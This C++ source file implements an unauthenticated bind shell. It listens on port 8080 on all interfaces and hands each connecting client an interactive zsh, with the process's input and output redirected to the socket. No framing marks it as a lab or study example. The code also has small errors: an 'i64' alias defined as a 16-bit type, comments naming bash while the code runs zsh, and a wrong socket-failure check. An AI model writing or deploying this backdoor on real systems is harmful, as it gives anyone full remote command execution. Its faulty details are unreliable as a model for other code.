#include <cstddef>
#include <cstdint>
#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

constexpr auto PORT = 8080;

using i8    = std::int8_t;
using u8    = std::uint8_t;
using i32   = std::int32_t;
using u32   = std::uint32_t;
using i64   = std::int16_t;
using u16   = std::uint16_t;
using usize = std::size_t;

void HandleClient(const i32 clientSocket)
{
    // Fork a child process to run bash
    const pid_t pid = fork();
    if (pid == 0)
    {
        // In the child process

        // Redirect stdin, stdout, stderr to the client socket
        dup2(clientSocket, STDIN_FILENO);
        dup2(clientSocket, STDOUT_FILENO);
        dup2(clientSocket, STDERR_FILENO);

        // Execute bash
        execl("/bin/zsh", "zsh", "-i", nullptr);

        // If execl fails
        perror("execl failed");
        exit(1);
    }
    else if (pid > 0)
    {
        // In the parent process

        // Wait for the bash process to finish
        waitpid(pid, nullptr, 0);
    }
    else
    {
        perror("fork failed");
    }

    close(clientSocket);
}

int main()
{
    i32                server_fd, client_socket;
    struct sockaddr_in address;
    const auto         opt     = 1;
    const auto         addrlen = sizeof(address);

    // Create a socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Set socket options
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
    {
        perror("setsockopt failed");
        exit(EXIT_FAILURE);
    }

    // Bind the socket to a port
    address.sin_family      = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port        = htons(PORT);

    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0)
    {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen for connections
    if (listen(server_fd, 3) < 0)
    {
        perror("listen failed");
        exit(EXIT_FAILURE);
    }

    std::cout << "Server listening on port " << PORT << std::endl;

    // Accept client connections
    while ((client_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) >= 0)
    {
        std::cout << "Client connected." << std::endl;
        HandleClient(client_socket);
    }

    if (client_socket < 0)
    {
        perror("accept failed");
        exit(EXIT_FAILURE);
    }

    close(server_fd);
    return 0;
}
